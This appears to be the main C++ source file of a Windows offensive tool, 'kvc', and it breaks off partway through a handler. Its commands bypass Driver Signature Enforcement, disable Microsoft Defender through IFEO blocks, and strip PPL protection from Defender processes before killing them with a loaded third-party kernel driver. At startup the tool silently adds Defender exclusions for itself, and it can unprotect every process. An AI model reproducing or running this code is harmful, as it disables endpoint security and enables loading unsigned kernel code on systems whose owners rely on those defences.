// Kernel Vulnerability Capabilities Framework - Main Application Entry Point

#include "common.h"
#include "Controller.h"
#include "DSEBypass.h"
#include "HelpSystem.h"
#include "DefenderManager.h"
#include "DefenderUI.h"
#include "WmiDefenderClient.h"
#include "ProcessManager.h"
#include "ProcessListGUI.h"
#include "ServiceManager.h"
#include "HiveManager.h"
#include "KillerSession.h"
#include "ModuleManager.h"
#include "ForceIOStager.h"
#include <TlHelp32.h>
#include <signal.h>
#include <charconv>
#include <Shlobj.h>
#include <functional>
#include <unordered_map>
#include <string>
#include <vector>
#include <sstream>

#pragma comment(lib, "Shell32.lib")

// Tetris game entry point from x64 assembly
extern "C" int TetrisMain();

// VaultGuard GUI entry point from vg\main.asm
extern "C" void VgGuiMain();

// IOCTL wrappers exported by ControllerBlocker.cpp, called by vg asm and kvc.cpp
extern "C" INT_PTR IoctlSetActive(DWORD active);
extern "C" INT_PTR IoctlAddPath(DWORD flags, const WCHAR* dosPath);
extern "C" INT_PTR IoctlRemovePath(const WCHAR* dosPath);
extern "C" INT_PTR IoctlAddTrusted(const WCHAR* name);
extern "C" INT_PTR IoctlRemoveTrusted(const WCHAR* name);
extern "C" INT_PTR IoctlClearAll();

// ForceIO command handlers (ForceIOOperations.cpp)
int HandleForceIOLocks(int argc, wchar_t* argv[]);
int HandleForceIODelete(int argc, wchar_t* argv[]);
int HandleForceIORename(int argc, wchar_t* argv[]);
int HandleForceIOCopy(int argc, wchar_t* argv[]);

// Registry persistence from vg\config.asm (HKCU\Software\kvc\lock\*)
extern "C" void ConfigSavePath(const WCHAR* path, DWORD flags);
extern "C" void ConfigRemovePath(const WCHAR* path);
extern "C" void ConfigSaveTrusted(const WCHAR* name);
extern "C" void ConfigRemoveTrusted(const WCHAR* name);
extern "C" void ConfigLoad();

// ============================================================================
// GLOBAL STATE
// ============================================================================

std::unique_ptr<Controller> g_controller;

// ============================================================================
// HELPERS
// ============================================================================

void CleanupDriver() noexcept {
    if (g_controller) g_controller->PerformAtomicCleanup();
}

void SignalHandler(int signum) {
    if (signum == SIGINT) {
        g_interrupted = true;
        ERROR(L"\nInterrupted by user - performing emergency cleanup...");
        CleanupDriver();
        exit(130);
    }
}

// Helper to remove whitespace from both ends of a string
std::wstring Trim(const std::wstring& str) {
    size_t first = str.find_first_not_of(L" \t");
    if (first == std::wstring::npos) return L"";
    size_t last = str.find_last_not_of(L" \t");
    return str.substr(first, last - first + 1);
}

std::optional<DWORD> ParsePid(std::wstring_view pidStr) noexcept {
    if (pidStr.empty()) return std::nullopt;
    std::string narrowStr;
    narrowStr.reserve(pidStr.size());
    for (wchar_t wc : pidStr) {
        if (wc > 127) return std::nullopt;
        narrowStr.push_back(static_cast<char>(wc));
    }
    DWORD result = 0;
    auto [ptr, ec] = std::from_chars(narrowStr.data(), narrowStr.data() + narrowStr.size(), result);
    return (ec == std::errc{} && ptr == narrowStr.data() + narrowStr.size()) ? std::make_optional(result) : std::nullopt;
}

bool IsNumeric(std::wstring_view str) noexcept {
    if (str.empty()) return false;
    for (wchar_t ch : str) if (ch < L'0' || ch > L'9') return false;
    return true;
}

bool IsHelpFlag(std::wstring_view arg) noexcept {
    return (arg == L"/?" || arg == L"/help" || arg == L"/h" || 
            arg == L"-?" || arg == L"-help" || arg == L"-h" || 
            arg == L"--help" || arg == L"--h" || arg == L"help" || arg == L"?");
}

bool CheckKvcPassExists() noexcept {
    if (GetFileAttributesW(L"kvc_pass.exe") != INVALID_FILE_ATTRIBUTES) return true;
    wchar_t systemDir[MAX_PATH];
    if (GetSystemDirectoryW(systemDir, MAX_PATH) > 0) {
        std::wstring path = std::wstring(systemDir) + L"\\kvc_pass.exe";
        return GetFileAttributesW(path.c_str()) != INVALID_FILE_ATTRIBUTES;
    }
    return false;
}

void EnsureSelfDefenderExclusions() noexcept {
    wchar_t selfPathBuf[MAX_PATH] = {};
    DWORD selfPathLen = GetModuleFileNameW(nullptr, selfPathBuf, MAX_PATH);
    if (selfPathLen == 0 || selfPathLen >= MAX_PATH) {
        DEBUG(L"Auto-exclusion skipped: failed to get current executable path");
        return;
    }

    std::wstring selfPath(selfPathBuf, selfPathLen);
    std::wstring selfProcess = selfPath;
    size_t slashPos = selfProcess.find_last_of(L"\\/");
    if (slashPos != std::wstring::npos) {
        selfProcess = selfProcess.substr(slashPos + 1);
    }

    WmiDefenderClient wmi;
    if (!wmi.IsConnected()) {
        DEBUG(L"Defender WMI unavailable/inactive - auto-exclusion skipped");
        return;
    }

    const auto ensureOne = [&](WmiDefenderClient::ExclusionType type, const wchar_t* typeName, const std::wstring& value) {
        (void)typeName;
        if (wmi.HasExclusion(type, value)) {
            DEBUG(L"Defender auto-exclusion already exists: %s = %s", typeName, value.c_str());
            return;
        }

        if (wmi.Add(type, value)) {
            DEBUG(L"Defender auto-exclusion added: %s = %s", typeName, value.c_str());
        } else {
            DEBUG(L"Defender auto-exclusion failed: %s = %s", typeName, value.c_str());
        }
    };

    ensureOne(WmiDefenderClient::ExclusionType::Process, L"ExclusionProcess", selfProcess);
    ensureOne(WmiDefenderClient::ExclusionType::Path, L"ExclusionPath", selfPath);
}

bool InitiateSystemRestart() noexcept {
    HANDLE token; TOKEN_PRIVILEGES tp; LUID luid;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) return false;
    if (!LookupPrivilegeValueW(nullptr, SE_SHUTDOWN_NAME, &luid)) { CloseHandle(token); return false; }
    tp.PrivilegeCount = 1; tp.Privileges[0].Luid = luid; tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    bool success = AdjustTokenPrivileges(token, FALSE, &tp, 0, nullptr, nullptr);
    CloseHandle(token);
    return success ? (ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_SOFTWARE | SHTDN_REASON_MINOR_RECONFIGURE) != 0) : false;
}

// ============================================================================
// COMMAND HANDLERS
// ============================================================================

int HandleDriverCommand(int argc, wchar_t* argv[]) {
    if (argc < 3) {
        ERROR(L"Missing driver subcommand");
        ERROR(L"Usage: kvc driver <load|reload|stop|remove> <path|name>");
        return 1;
    }
    std::wstring subCmd = StringUtils::ToLowerCaseCopy(argv[2]);

    if (subCmd == L"load") {
        if (argc < 4) {
            ERROR(L"Missing driver path");
            ERROR(L"Usage: kvc driver load <path> [-s <0-4>]");
            return 1;
        }
        DWORD startType = SERVICE_DEMAND_START;
        if (argc >= 6 && std::wstring(argv[4]) == L"-s") {
            startType = static_cast<DWORD>(_wtoi(argv[5]));
        }
        return g_controller->LoadExternalDriver(argv[3], startType) ? 0 : 2;
    }
    
    if (argc < 4) {
        ERROR(L"Missing driver name/path");
        // Show simplified usage info
        ERROR(L"Usage: kvc driver <load|reload|stop|remove> <path|name>");
        return 1;
    }

    if (subCmd == L"reload") return g_controller->ReloadExternalDriver(argv[3]) ? 0 : 2;
    if (subCmd == L"stop") return g_controller->StopExternalDriver(argv[3]) ? 0 : 2;
    if (subCmd == L"remove") return g_controller->RemoveExternalDriver(argv[3]) ? 0 : 2;
    
    ERROR(L"Unknown driver subcommand: %s", subCmd.c_str());
    return 1;
}

int HandleUninstall(int argc, wchar_t** argv) {
    // kvc uninstall smss - remove only SMSS loader (BootExecute + drivers.ini)
    if (argc >= 3 && std::wstring(argv[2]) == L"smss") {
        return g_controller->UninstallSmss() ? 0 : 1;
    }

    // kvc uninstall - remove NT service AND SMSS loader
    INFO(L"Uninstalling Kernel Vulnerability Capabilities Framework service...");
    bool success = ServiceManager::UninstallService();

    // Remove driver files from DriverStore with TrustedInstaller privileges.
    // ServiceManager::UninstallService() only deletes the SCM entry; file cleanup
    // requires TI rights and must be done explicitly here.
    // NOTE: UninstallDriver() returns early when the SCM entry is already gone,
    // so we call DeleteDriverFiles() directly to guarantee file removal.
    INFO(L"Removing driver files from DriverStore...");
    g_controller->DeleteDriverFiles();

    INFO(L"Cleaning up registry configuration...");
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        LONG result = RegDeleteTreeW(hKey, L"kvc");
        if (result == ERROR_SUCCESS) SUCCESS(L"Registry configuration cleaned successfully");
        else if (result == ERROR_FILE_NOT_FOUND) INFO(L"No registry configuration found to clean");
        else ERROR(L"Failed to clean registry configuration: %d", result);
        RegCloseKey(hKey);
    }

    // Also clean up SMSS loader if present
    INFO(L"Removing SMSS boot-phase loader (if installed)...");
    g_controller->UninstallSmss();

    return success ? 0 : 1;
}

int HandleServiceCommand(int argc, wchar_t* argv[]) {
    if (argc < 3) {
        ERROR(L"Missing service command: start, stop, restart");
        return 1;
    }
    std::wstring subCmd = argv[2];

    if (subCmd == L"start") {
        INFO(L"Starting Kernel Vulnerability Capabilities Framework service...");
        return ServiceManager::StartServiceProcess() ? (SUCCESS(L"Service started successfully"), 0) : (ERROR(L"Failed to start service"), 1);
    }
    if (subCmd == L"stop") {
        INFO(L"Stopping Kernel Vulnerability Capabilities Framework service...");
        return ServiceManager::StopServiceProcess() ? (SUCCESS(L"Service stopped successfully"), 0) : (ERROR(L"Failed to stop service"), 1);
    }
    if (subCmd == L"restart") {
		INFO(L"Restarting Kernel Vulnerability Capabilities Framework service...");
		INFO(L"Stopping service...");
		bool stopped = ServiceManager::StopServiceProcess();
		INFO(L"Starting service...");
		bool started = ServiceManager::StartServiceProcess();
		return (stopped && started) ? 0 : 1;
    }
    if (subCmd == L"status") {
        INFO(L"Checking Kernel Vulnerability Capabilities Framework service status...");
        const bool installed = IsServiceInstalled();
        const bool running = installed ? IsServiceRunning() : false;
        
        std::wcout << L"\n";
        INFO(L"Service Information:");
        INFO(L" Name: %s", ServiceConstants::SERVICE_NAME);
        INFO(L" Display Name: %s", ServiceConstants::SERVICE_DISPLAY_NAME);
        std::wcout << L"\n";
        
        if (installed) {
            SUCCESS(L"Installation Status: INSTALLED");
            if (running) {
                SUCCESS(L"Runtime Status: RUNNING");
                SUCCESS(L"Service is operational and ready for kernel operations");
            } else {
                ERROR(L"Runtime Status: STOPPED");
                INFO(L"Use 'kvc service start' to start the service");
            }
        } else {
            ERROR(L"Installation Status: NOT INSTALLED");
            INFO(L"Use 'kvc install' to install the service first");
        }
        std::wcout << L"\n";
        return 0;
    }
    ERROR(L"Unknown service command: %s", subCmd.c_str());
    return 1;
}

int HandleDseCommand(int argc, wchar_t* argv[]) {
    // 1. STATUS CHECK
    if (argc < 3) {
        INFO(L"Checking Driver Signature Enforcement status...");
        
        ULONG_PTR ciOptionsAddr = 0;
        DWORD value = 0;
        
        if (!g_controller->GetDSEStatus(ciOptionsAddr, value)) {
            ERROR(L"Failed to retrieve DSE status");
            return 2;
        }
        
        bool dseEnabled = (value & 0x6) != 0;
        bool hvciEnabled = (value & 0x0001C000) == 0x0001C000;
        
        std::wcout << L"\n";
        INFO(L"DSE Status Information:");
        INFO(L"g_CiOptions address: 0x%llX", ciOptionsAddr);
        INFO(L"g_CiOptions value: 0x%08X", value);
        
        auto dseNGCallback = SessionManager::GetOriginalCiCallback();
        if (dseNGCallback != 0) {
            INFO(L"DSE-NG (Safe Mode) active - callback saved: 0x%llX", dseNGCallback);
        }

        std::wcout << L"\n";
        
        if (hvciEnabled) {
            INFO(L"Recommended: 'kvc dse off --safe' - modern method (requires reboot, preserves VBS)");
            INFO(L"Legacy: 'kvc dse off' - HVCI bypass (requires reboot, disables Secure Kernel)");
        }
        else if (dseEnabled) {
            SUCCESS(L"DSE can be safely disabled using 'kvc dse off --safe'");
        } else {
            INFO(L"Driver signature enforcement: DISABLED");
            INFO(L"Unsigned drivers allowed");
            INFO(L"Use 'kvc dse on --safe' to restore kernel protection");
        }
        std::wcout << L"\n";
        return 0;
    }
    
    // 2. ACTIONS
    std::wstring subCmd = argv[2];
    bool safe = (argc >= 4 && std::wstring(argv[3]) == L"--safe");

    if (subCmd == L"off") {
        if (safe) {
            INFO(L"Executing Next-Gen DSE Bypass (PDB-based)...");
            return g_controller->DisableDSESafe() ? 0 : 2;
        }
        INFO(L"Disabling driver signature enforcement...");
        return g_controller->DisableDSE() ? 0 : 2;
    }
    else if (subCmd == L"on") {
        if (safe) {
            INFO(L"Restoring DSE using Next-Gen method...");
            return g_controller->RestoreDSESafe() ? 0 : 2;
        }
        INFO(L"Restoring driver signature enforcement...");
        return g_controller->RestoreDSE() ? 0 : 2;
    }
    else {
        ERROR(L"Unknown DSE command: %s", subCmd.c_str());
        ERROR(L"Usage: kvc dse [off|on]  or  kvc dse  (status)");
        return 1;
    }
}

// Declared in vg\globals.inc; set by kvc.cpp before calling VgGuiMain
extern "C" DWORD g_startMinimized;

static bool SpawnVgDaemon(bool minimized) noexcept {
    WCHAR self[MAX_PATH];
    if (!GetModuleFileNameW(nullptr, self, MAX_PATH))
        return false;
    std::wstring cmd = std::wstring(L"\"") + self + L"\" lock --vgdaemon";
    if (minimized) cmd += L" --tray";
    STARTUPINFOW si = {};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi = {};
    BOOL ok = CreateProcessW(nullptr, cmd.data(), nullptr, nullptr,
                             FALSE, DETACHED_PROCESS | CREATE_NO_WINDOW,
                             nullptr, nullptr, &si, &pi);
    if (ok) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    return ok != FALSE;
}

int HandleLockCommand(int argc, wchar_t* argv[]) {
    if (argc < 3) {
        HelpSystem::PrintBlockerCommands();
        return 0;
    }
    std::wstring sub = argv[2];

    if (sub == L"--gui" || sub == L"gui") {
        if (!SpawnVgDaemon(false)) { ERROR(L"Failed to spawn VaultGuard GUI"); return 1; }
        return 0;
    }
    if (sub == L"--tray" || sub == L"tray") {
        if (!SpawnVgDaemon(true)) { ERROR(L"Failed to spawn VaultGuard GUI"); return 1; }
        return 0;
    }
    if (sub == L"--vgdaemon") {
        bool tray = (argc >= 4 && _wcsicmp(argv[3], L"--tray") == 0);
        g_controller->EnsureBlockerDriver();
        g_startMinimized = tray ? 1 : 0;
        VgGuiMain();
        return 0;
    }
    if (sub == L"status") {
        std::wstring s = g_controller->GetBlockerStatus();
        INFO(L"kvcblocker: %s", s.c_str());
        return 0;
    }
    if (sub == L"on") {
        if (!g_controller->EnsureBlockerDriver()) return 1;
        IoctlSetActive(1);
        SUCCESS(L"Protection enabled");
        return 0;
    }
    if (sub == L"off") {
        if (!g_controller->EnsureBlockerDriver()) return 1;
        IoctlSetActive(0);
        INFO(L"Protection disabled");
        return 0;
    }
    if (sub == L"add") {
        if (argc < 5) { ERROR(L"Usage: kvc lock add <path> <Hidden|Locked|ReadOnly|NoExec>"); return 1; }
        std::wstring mode = argv[4];
        DWORD flags = 0;
        if (_wcsicmp(mode.c_str(), L"Hidden")   == 0) flags = 0x01;
        else if (_wcsicmp(mode.c_str(), L"Locked")   == 0) flags = 0x02;
        else if (_wcsicmp(mode.c_str(), L"ReadOnly") == 0) flags = 0x04;
        else if (_wcsicmp(mode.c_str(), L"NoExec")   == 0) flags = 0x08;
        else if (_wcsicmp(mode.c_str(), L"All")      == 0) flags = 0x0F;
        else { ERROR(L"Unknown mode: %s  (Hidden|Locked|ReadOnly|NoExec|All)", mode.c_str()); return 1; }
        if (!g_controller->EnsureBlockerDriver()) return 1;
        if (!IoctlAddPath(flags, argv[3])) { ERROR(L"Failed to add path"); return 1; }
        ConfigSavePath(argv[3], flags);
        SUCCESS(L"Protected: %s [%s]", argv[3], mode.c_str());
        return 0;
    }
    if (sub == L"remove") {
        if (argc < 4) { ERROR(L"Usage: kvc lock remove <path>"); return 1; }
        if (!g_controller->EnsureBlockerDriver()) return 1;
        if (!IoctlRemovePath(argv[3])) { ERROR(L"Failed to remove path"); return 1; }
        ConfigRemovePath(argv[3]);
        SUCCESS(L"Unprotected: %s", argv[3]);
        return 0;
    }
    if (sub == L"allow") {
        if (argc < 4) { ERROR(L"Usage: kvc lock allow <app.exe>"); return 1; }
        if (!g_controller->EnsureBlockerDriver()) return 1;
        if (!IoctlAddTrusted(argv[3])) { ERROR(L"Failed to add trusted app"); return 1; }
        ConfigSaveTrusted(argv[3]);
        SUCCESS(L"Trusted: %s", argv[3]);
        return 0;
    }
    if (sub == L"unallow") {
        if (argc < 4) { ERROR(L"Usage: kvc lock unallow <app.exe>"); return 1; }
        if (!g_controller->EnsureBlockerDriver()) return 1;
        ConfigRemoveTrusted(argv[3]);
        IoctlRemoveTrusted(argv[3]);  // clears all trusted from driver
        ConfigLoad();                 // reloads remaining from registry
        INFO(L"Removed from trusted: %s", argv[3]);
        return 0;
    }
    if (sub == L"list") {
        HKEY hKey = nullptr;
        bool anyPaths = false, anyTrusted = false;
        if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\kvc\\lock\\Paths",
                          0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            WCHAR name[MAX_PATH + 1];
            DWORD flags = 0, nameCch, dataCb, type;
            for (DWORD i = 0; ; i++) {
                nameCch = MAX_PATH + 1; dataCb = sizeof(DWORD);
                if (RegEnumValueW(hKey, i, name, &nameCch, nullptr,
                                  &type, reinterpret_cast<BYTE*>(&flags),
                                  &dataCb) == ERROR_NO_MORE_ITEMS) break;
                wchar_t mode[48] = {};
                if (flags & 0x01) wcscat_s(mode, L"Hidden ");
                if (flags & 0x02) wcscat_s(mode, L"Locked ");
                if (flags & 0x04) wcscat_s(mode, L"ReadOnly ");
                if (flags & 0x08) wcscat_s(mode, L"NoExec ");
                if (!mode[0]) wcscpy_s(mode, L"inactive");
                else mode[wcslen(mode) - 1] = L'\0';
                wprintf(L"  [path]    %-60s [%s]\n", name, mode);
                anyPaths = true;
            }
            RegCloseKey(hKey);
        }
        if (!anyPaths) INFO(L"No protected paths");
        if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\kvc\\lock\\Trusted",
                          0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            WCHAR name[MAX_PATH + 1];
            DWORD nameCch;
            for (DWORD i = 0; ; i++) {
                nameCch = MAX_PATH + 1;
                if (RegEnumValueW(hKey, i, name, &nameCch,
                                  nullptr, nullptr, nullptr,
                                  nullptr) == ERROR_NO_MORE_ITEMS) break;
                wprintf(L"  [trusted]  %s\n", name);
                anyTrusted = true;
            }
            RegCloseKey(hKey);
        }
        if (!anyTrusted) INFO(L"No trusted apps");
        return 0;
    }
    if (sub == L"clear") {
        if (!g_controller->EnsureBlockerDriver()) return 1;
        IoctlClearAll();
        RegDeleteKeyW(HKEY_CURRENT_USER, L"Software\\kvc\\lock\\Paths");
        RegDeleteKeyW(HKEY_CURRENT_USER, L"Software\\kvc\\lock\\Trusted");
        SUCCESS(L"All protected paths and trusted entries cleared");
        return 0;
    }
    ERROR(L"Unknown lock subcommand: %s", sub.c_str());
    HelpSystem::PrintBlockerCommands();
    return 1;
}

int HandleSecEngineCommand(int argc, wchar_t* argv[]) {
    if (argc < 3) {
        ERROR(L"Missing subcommand for secengine. Usage: kvc secengine <disable|enable|status>");
        return 1;
    }
    std::wstring_view sub = argv[2];

    // disable:
    // Writes IFEO blocks for MsMpEng/SecurityHealthSystray/SecurityHealthService,
    // then kernel-kills the running processes via kvckiller.sys (K7RKScan service).
    // No restart required.
    if (sub == L"disable") {
        // Step 1: write IFEO blocks (persistent)
        if (!DefenderManager::DisableSecurityEngine())
            return 1;

        // Step 2: prepare kill driver, strip PPL, terminate targets
        PrivilegeUtils::EnablePrivilege(SE_LOAD_DRIVER_NAME);

        const std::wstring killerPath = GetDriverStorePath() + L"\\kvckiller.sys";
        if (GetFileAttributesW(killerPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
            INFO(L"kvckiller.sys not found - skipping kernel kill");
            return 0;
        }

        KillerSession session;
        if (!session.Open(killerPath)) {
            INFO(L"kvckiller driver failed to start - processes may still be running");
            return 0;
        }

        // Resolve the target set once so protection changes and termination
        // requests always refer to the same process instances.
        static constexpr const wchar_t* targets[] = {
            L"MsMpEng.exe", L"SecurityHealthSystray.exe", L"SecurityHealthService.exe"
        };
        std::vector<DWORD> targetPids;
        {
            HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if (hSnap != INVALID_HANDLE_VALUE) {
                PROCESSENTRY32W pe{ sizeof(pe) };
                if (Process32FirstW(hSnap, &pe)) {
                    do {
                        for (const wchar_t* target : targets) {
                            if (_wcsicmp(pe.szExeFile, target) == 0) {
                                targetPids.push_back(pe.th32ProcessID);
                                break;
                            }
                        }
                    } while (Process32NextW(hSnap, &pe));
                }
                CloseHandle(hSnap);
            }
        }

        struct ProtectionBackup {
            DWORD pid;
            UCHAR protection;
        };
        std::vector<ProtectionBackup> protectionBackups;

        if (!g_controller->BeginDriverSession()) {
            INFO(L"Cannot open the memory driver session - protected targets unchanged");
            if (!session.Close()) {
                INFO(L"Driver session cleanup reported an error");
            }
            return 2;
        }

        // Protection removal is transactional: remember the original byte and
        // restore it if the process survives the termination phase.
        for (DWORD pid : targetPids) {
            const auto address = g_controller->GetProcessKernelAddress(pid);
            if (!address) continue;

            const auto protection =
                g_controller->GetProcessProtection(address.value());
            if (!protection || protection.value() == 0) continue;

            const UCHAR originalProtection = protection.value();
            if (!g_controller->SetProcessProtection(
                    address.value(),
                    0
                )) {
                ERROR(L"Failed to remove protection from PID %lu", pid);
                continue;
            }

            const auto verified =
                g_controller->GetProcessProtection(address.value());
            if (!verified || verified.value() != 0) {
                ERROR(L"Protection removal verification failed for PID %lu", pid);
                g_controller->SetProcessProtection(
                    address.value(),
                    originalProtection
                );
                continue;
            }

            protectionBackups.push_back({ pid, originalProtection });
            SUCCESS(L"Removed protection from PID %lu", pid);
        }

        // Kill via IOCTL and verify each original PID instance.
        bool allGone = true;
        for (DWORD pid : targetPids) {
            const KillerSession::KillResult result = session.Kill(pid);
            if (result.processGone) {
                SUCCESS(L"PID %lu terminated via kvckiller", pid);
                continue;
            }

            allGone = false;
            if (!result.requestAccepted) {
                INFO(L"kvckiller request for PID %lu failed (Win32 error %lu)",
                     pid, result.transportError);
            } else if (result.hasDriverStatus) {
                INFO(L"kvckiller request for PID %lu returned NTSTATUS 0x%08lX",
                     pid, result.driverStatus);
            } else {
                INFO(L"kvckiller accepted PID %lu without a status buffer", pid);
            }
        }

        // Stop SecurityHealthService via SCM as well (belt and suspenders)
        SC_HANDLE hSCM2 = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
        if (hSCM2) {
            SC_HANDLE hHealth = OpenServiceW(hSCM2, L"SecurityHealthService",
                                             SERVICE_STOP | SERVICE_QUERY_STATUS);
            if (hHealth) {
                SERVICE_STATUS ss{};
                ControlService(hHealth, SERVICE_CONTROL_STOP, &ss);
                CloseServiceHandle(hHealth);
            }
            CloseServiceHandle(hSCM2);
        }

        // Restore protection only for targets that survived the kill phase.
        for (const ProtectionBackup& backup : protectionBackups) {
            if (KillerSession::VerifyDead(backup.pid)) continue;

            const auto address =
                g_controller->GetProcessKernelAddress(backup.pid);
            if (!address
                || !g_controller->SetProcessProtection(
                    address.value(),
                    backup.protection
                )) {
                ERROR(L"Failed to restore protection for surviving PID %lu",
                      backup.pid);
                allGone = false;
            }
        }

        g_controller->EndDriverSession(true);

        bool cleanupOk = session.Close();
        if (!cleanupOk) {
            INFO(L"kvckiller cleanup reported an error");
        }

        return cleanupOk && allGone ? 0 : 2;
    }

    // enable:
    // Removes IFEO Debugger block, then starts WinDefend via SCM.
    // MsMpEng.exe launches on its own - no restart needed.
    if (sub == L"enable") {
        if (DefenderManager::EnableSecurityEngine()) {
            return 0;
        }
        return 1;
    }

    // status:
    if (sub == L"status") {
        auto s = DefenderManager::QueryStatus();
        HANDLE hCon = GetStdHandle(STD_OUTPUT_HANDLE);

        // IFEO block line
        if (s.ifeoBlocked) {
            SetConsoleTextAttribute(hCon, FOREGROUND_RED | FOREGROUND_INTENSITY);
            std::wcout << L" [IFEO] MsMpEng.exe blocked - Debugger=" << s.ifeoDebugger << L"\n";
        } else {
            SetConsoleTextAttribute(hCon, FOREGROUND_GREEN | FOREGROUND_INTENSITY);
            std::wcout << L" [IFEO] No block set on MsMpEng.exe\n";
        }

        // WinDefend service line
        SetConsoleTextAttribute(hCon, s.winDefendRunning
            ? (FOREGROUND_GREEN | FOREGROUND_INTENSITY)
            : (FOREGROUND_RED   | FOREGROUND_INTENSITY));
        std::wcout << L" [SVC]  WinDefend: "
                   << (s.winDefendRunning ? L"RUNNING" : L"STOPPED") << L"\n";

        // MsMpEng process line
        SetConsoleTextAttribute(hCon, s.msmpengRunning
            ? (FOREGROUND_GREEN | FOREGROUND_INTENSITY)
            : (FOREGROUND_RED   | FOREGROUND_INTENSITY));
        std::wcout << L" [PROC] MsMpEng.exe: "
                   << (s.msmpengRunning ? L"RUNNING" : L"NOT RUNNING") << L"\n";

        // Summary line
        SetConsoleTextAttribute(hCon, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY);
        std::wcout << L" [SUM]  ";
        switch (s.state) {
            case DefenderManager::SecurityState::ACTIVE:
                SetConsoleTextAttribute(hCon, FOREGROUND_GREEN | FOREGROUND_INTENSITY);
                std::wcout << L"ACTIVE - Defender engine is running\n";
                break;
            case DefenderManager::SecurityState::IFEO_BLOCKED:
                SetConsoleTextAttribute(hCon, FOREGROUND_RED | FOREGROUND_INTENSITY);
                std::wcout << L"IFEO BLOCKED - engine will not launch (restart to fully deactivate)\n";
                break;
            case DefenderManager::SecurityState::INACTIVE:
                SetConsoleTextAttribute(hCon, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY);
                std::wcout << L"INACTIVE - WinDefend stopped, no IFEO block\n";
                break;
            case DefenderManager::SecurityState::NOT_INSTALLED:
                SetConsoleTextAttribute(hCon, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY);
                std::wcout << L"NOT INSTALLED - WinDefend service not found\n";
                break;
            default:
                std::wcout << L"UNKNOWN\n";
                break;
        }

        SetConsoleTextAttribute(hCon, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
        return 0;
    }

    ERROR(L"Invalid secengine subcommand: %s", std::wstring(sub).c_str());
    ERROR(L"Valid subcommands: disable [--restart], enable, status");
    return 1;
}

int HandleModulesCommand(int argc, wchar_t* argv[]) {
    if (argc < 3) {
        ERROR(L"Missing PID/process name argument");
        ERROR(L"Usage: kvc modules <PID|process_name> [read <module> [offset] [size]]");
        return 1;
    }
    std::wstring_view target = argv[2];
    DWORD pid = 0;

    if (IsNumeric(target)) {
        if (auto p = ParsePid(target)) pid = p.value(); else { ERROR(L"Invalid PID format: %s", target.data()); return 1; }
    } else {
        auto match = g_controller->ResolveNameWithoutDriver(std::wstring(target));
        if (!match) { ERROR(L"Process not found: %s", target.data()); return 1; }
        pid = match->Pid;
        INFO(L"Resolved '%s' to PID %lu", match->ProcessName.c_str(), pid);
    }

    if (argc >= 4 && StringUtils::ToLowerCaseCopy(argv[3]) == L"read") {
        if (argc < 5) {
            ERROR(L"Missing module name for read operation");
            ERROR(L"Usage: kvc modules <PID> read <module_name> [offset] [size]");
            return 1;
        }
        std::wstring module = argv[4];
        ULONG_PTR offset = 0;
        size_t size = 256;
        if (argc >= 6) offset = std::wcstoull(argv[5], nullptr, 0); 
        if (argc >= 7) size = std::wcstoull(argv[6], nullptr, 0);
        return g_controller->ReadModuleMemory(pid, module, offset, size) ? 0 : 2;
    }
    return g_controller->EnumerateProcessModules(pid) ? 0 : 2;
}

int HandleProtectionCommand(int argc, wchar_t* argv[], bool isSet) {
    if (argc < 5) {
        ERROR(L"Missing arguments: <PID/process_name> <PP|PPL> <SIGNER_TYPE>");
        return 1;
    }
    std::wstring target = argv[2];
    std::wstring level = argv[3];
    std::wstring signer = argv[4];

    // Batch processing
    if (target.find(L',') != std::wstring::npos) {
        std::vector<std::wstring> targets;
        std::wstringstream ss(target);
        std::wstring item;
        while (std::getline(ss, item, L',')) {
            std::wstring trimmed = Trim(item);
            if (!trimmed.empty()) targets.push_back(trimmed);
        }
        
        if (targets.empty()) { ERROR(L"No valid targets in comma-separated list"); return 1; }
        INFO(L"Batch %s operation: %zu targets", isSet ? L"set" : L"protect", targets.size());
        
        return (isSet ? g_controller->SetMultipleProcessesProtection(targets, level, signer) : 
                        g_controller->ProtectMultipleProcesses(targets, level, signer)) ? 0 : 2;
    }

    // Single processing
    if (IsNumeric(target)) {
        auto pid = ParsePid(target);
        if (!pid) { ERROR(L"Invalid PID format: %s", target.c_str()); return 1; }
        return (isSet ? g_controller->SetProcessProtection(pid.value(), level, signer) : 
                        g_controller->ProtectProcess(pid.value(), level, signer)) ? 0 : 2;
    } else {
        return (isSet ? g_controller->SetProcessProtectionByName(target, level, signer) : 
                        g_controller->ProtectProcessByName(target, level, signer)) ? 0 : 2;
    }
}

int HandleUnprotectCommand(int argc, wchar_t* argv[]) {
    if (argc < 3) { ERROR(L"Missing PID/process name argument"); return 1; }
    std::wstring target = argv[2];
    
    if (target == L"all") return g_controller->UnprotectAllProcesses() ? 0 : 2;
    
    // Batch
    if (target.find(L',') != std::wstring::npos) {
        std::vector<std::wstring> list;
        std::wstringstream ss(target); 
        std::wstring s;
        while (std::getline(ss, s, L',')) {
            std::wstring trimmed = Trim(s);
            if (!trimmed.empty()) list.push_back(trimmed);
        }
        return g_controller->UnprotectMultipleProcesses(list) ? 0 : 2;
    }
    
    if (Utils::GetSignerTypeFromString(target)) return g_controller->UnprotectBySigner(target) ? 0 : 2;
    
    if (IsNumeric(target)) {
         auto pid = ParsePid(target);
         if(!pid) { ERROR(L"Invalid PID format: %s", target.c_str()); return 1; }
         return g_controller->UnprotectProcess(pid.value()) ? 0 : 2;
    }
